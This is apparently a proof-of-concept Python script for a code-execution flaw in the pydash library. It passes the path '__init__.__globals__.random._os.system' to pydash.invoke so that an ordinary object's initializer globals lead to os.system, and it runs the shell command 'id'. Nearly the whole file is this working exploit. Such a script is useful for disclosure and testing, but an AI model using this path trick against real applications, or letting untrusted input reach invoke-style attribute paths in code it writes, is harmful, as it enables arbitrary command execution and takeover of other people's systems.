import sys
import random

import pydash


class Animal:
    def __init__(self, typ, age):
        self.type = typ
        self.age = age
        self.id = random.randint(1, 99999)


def poc(path, arg):
    """
        Use a malicious path to execute code via the __init__.__globals__ dict (not available with dict/list input objects?)
        I.e: pydash.invoke(obj, '__init__.__globals__.random._os.system', 'id')
    """

    obj = Animal('cat', 11)
    res = pydash.invoke(obj, path, arg)
    print(res)


if __name__ == '__main__':
    poc("__init__.__globals__.random._os.system", "id")
